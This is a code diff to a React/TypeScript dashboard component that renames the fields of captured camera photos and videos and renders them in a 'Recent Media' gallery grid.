@@ -253,7 +253,7 @@ export default function Home() {
     const [liveFrame, setLiveFrame] = useState<string | null>(null);
     const [recordingProgress, setRecordingProgress] = useState({ current: 0, total: 0 });
     const [recordingDuration, setRecordingDuration] = useState<number>(0);
-    const [capturedMedia, setCapturedMedia] = useState<{ type: string; data: string; camera: string; timestamp: number }[]>([]);
+    const [capturedMedia, setCapturedMedia] = useState<any[]>([]);
     const [cameraError, setCameraError] = useState<string | null>(null);
     const [isCheckingPermissions, setIsCheckingPermissions] = useState(false);
     const [streamQuality, setStreamQuality] = useState(360); // 144, 240, 360, 480, 720
@@ -593,10 +593,11 @@ export default function Home() {
                 setIsCapturingPhoto(false);
                 if (data.image) {
                     setCapturedMedia(prev => [{
-                        type: 'photo',
-                        data: data.image,
-                        camera: data.camera || 'back',
-                        timestamp: data.timestamp || Date.now()
+                        id: `capture_${data.camera || 'back'}_${data.timestamp || Date.now()}`,
+                        resource_type: 'image',
+                        url: data.image,
+                        created_at: new Date(data.timestamp || Date.now()).toISOString(),
+                        camera: data.camera || 'back'
                     }, ...prev]);
                 }
             });
@@ -607,10 +608,11 @@ export default function Home() {
                 setRecordingProgress({ current: 0, total: 0 });
                 if (data.video) {
                     setCapturedMedia(prev => [{
-                        type: 'video',
-                        data: data.video,
-                        camera: data.camera || 'back',
-                        timestamp: data.timestamp || Date.now()
+                        id: `video_${data.camera || 'back'}_${data.timestamp || Date.now()}`,
+                        resource_type: 'video',
+                        url: data.video,
+                        created_at: new Date(data.timestamp || Date.now()).toISOString(),
+                        camera: data.camera || 'back'
                     }, ...prev]);
                 }
             });
@@ -903,8 +905,10 @@ export default function Home() {
                     .then((data) => {
                         const items = data.items || (Array.isArray(data) ? data : []);
                         const captures = items.map((item: any) => ({
-                            type: item.resource_type === 'video' || item.id.includes('video_') ? 'video' : 'photo',
-                            data: item.url,
+                            id: item.id,
+                            resource_type: item.resource_type === 'video' || item.id.includes('video_') ? 'video' : 'image',
+                            url: item.url,
+                            created_at: item.created_at,
                             camera: item.id.includes('front') ? 'front' : 'back',
                             timestamp: new Date(item.created_at).getTime()
                         }));
@@ -1817,19 +1821,19 @@ END:VCARD`;
                                         <div className="flex items-center gap-3">
                                             <div className="w-10 h-10 rounded-xl bg-pink-500/10 flex items-center justify-center border border-pink-500/20">
                                                 <ImageIcon size={20} className="text-pink-400" />
-                                            </div>
+</div>
                                             <div>
                                                 <h3 className="font-bold text-lg text-white/90 leading-tight">Recent Media</h3>
                                                 <p className="text-[10px] text-pink-400 font-data tracking-widest uppercase">From Camera</p>
                                             </div>
                                         </div>
-                                        {filteredImages.length > 0 && (
+                                        {capturedMedia.length > 0 && (
                                             <button 
                                                 onClick={() => {
                                                     setIsCameraSelectMode(!isCameraSelectMode);
                                                     setCameraSelectedItems(new Set());
                                                 }}
-                                                className={`text-xs font-bold px-4 py-2 rounded-xl border transition-all ${isCameraSelectMode ? 'bg-cyan-500/20 text-cyan-400 border-cyan-500/50 shadow-[0_0_15px_rgba(6,182,212,0.2)]' : 'bg-white/5 text-white/70 border-white/10 hover:bg-white/10 hover:text-white'}`}
+                                                className={`px-3 py-1.5 text-xs font-semibold rounded-lg border transition-all flex items-center gap-1.5 ${isCameraSelectMode ? 'bg-cyan-500/20 text-cyan-400 border-cyan-500/50' : 'bg-white/5 text-white/70 border-white/10 hover:bg-white/10'}`}
                                             >
                                                 {isCameraSelectMode ? 'Cancel' : 'Select'}
                                             </button>
@@ -1869,7 +1873,7 @@ END:VCARD`;
 
                                     <div className="flex-1 overflow-y-auto custom-scrollbar pr-2 pb-4">
                                         <div className="grid grid-cols-2 gap-3">
-                                            {filteredImages.slice(0, 10).map((img: any) => (
+                                            {capturedMedia.slice(0, 10).map((img: any) => (
                                                 <div 
                                                     key={img.id} 
                                                     className={`flex flex-col bg-black/40 border transition-all rounded-xl overflow-hidden ${isCameraSelectMode && cameraSelectedItems.has(img.id) ? 'border-cyan-500 shadow-[0_0_15px_rgba(6,182,212,0.3)] scale-95' : 'border-white/5 hover:border-pink-500/50 hover:shadow-[0_0_15px_rgba(236,72,153,0.15)]'}`}
@@ -1930,7 +1934,7 @@ END:VCARD`;
                                                 </div>
                                             ))}
                                         </div>
-                                        {filteredImages.length === 0 && (
+                                        {capturedMedia.length === 0 && (
                                             <div className="w-full flex flex-col items-center justify-center text-white/30 text-center gap-3 p-4 min-h-[200px] bg-white/5 rounded-2xl border border-white/5 border-dashed mt-2">
                                                 <Camera size={40} strokeWidth={1} />
                                                 <p className="text-xs font-medium">No recent captures.<br/>Snap a photo or record a video!</p>
